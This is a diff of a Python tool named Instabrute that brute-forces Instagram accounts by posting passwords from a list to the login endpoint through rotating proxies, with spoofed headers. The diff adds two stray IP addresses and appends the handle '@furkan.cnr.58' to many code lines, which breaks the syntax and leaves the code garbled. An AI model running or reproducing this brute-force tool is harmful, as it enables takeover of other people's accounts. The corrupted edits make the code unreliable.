@@ -1,5 +1,5 @@
-
-'''
+51.15.46.137
+'''149.56.81.59
 TODO LIST:
 	Fix and make proxy function better
 	Sort code again
@@ -24,8 +24,8 @@ def Input(text):
 
 #The main class
 class Instabrute():
-	def __init__(self, username, passwordsFile='pass.txt'):
-		self.username = username
+	def __init__(self, username, passwordsFile='pass.txt'):@furkan.cnr.58
+		self.username = username@furkan.cnr.58
 		self.CurrentProxy = ''
 		self.UsedProxys = []
 		self.passwordsFile = passwordsFile
@@ -77,9 +77,9 @@ class Instabrute():
 
 	#Check if username exists in instagram server
 	def IsUserExists(self):
-		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
+		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) @furkan.cnr.58
 		if (r.status_code == 404):
-			print ('[*] User named "%s" not found' % username)
+			print ('[*] User named "%s" not found' % username)@furkan.cnr.58
 			Input('[*] Press enter to exit')
 			exit()
 		elif (r.status_code == 200):
@@ -93,7 +93,7 @@ class Instabrute():
 			sess.proxies = { "http": self.CurrentProxy, "https": self.CurrentProxy }
 
 		#build requests headers
-		sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
+		sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})@furkan.cnr.58
 		sess.headers.update({
 			'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
 			'x-instagram-ajax':'1',
@@ -114,7 +114,7 @@ class Instabrute():
 		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
 
 		#Update token after login to the site 
-		r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username':self.username, 'password':password}, allow_redirects=True)
+		r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username':self.username, 'password':password}, allow_redirects=True)@furkan.cnr.58
 		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
 		
 		#parse response
@@ -139,7 +139,7 @@ class Instabrute():
 
 
 
-instabrute = Instabrute(Input('Please enter a username: '))
+instabrute = Instabrute(Input('Please enter a username: '))@furkan.cnr.58
 
 try:
 	delayLoop = int(Input('[*] Please add delay between the bruteforce action (in seconds): ')) 
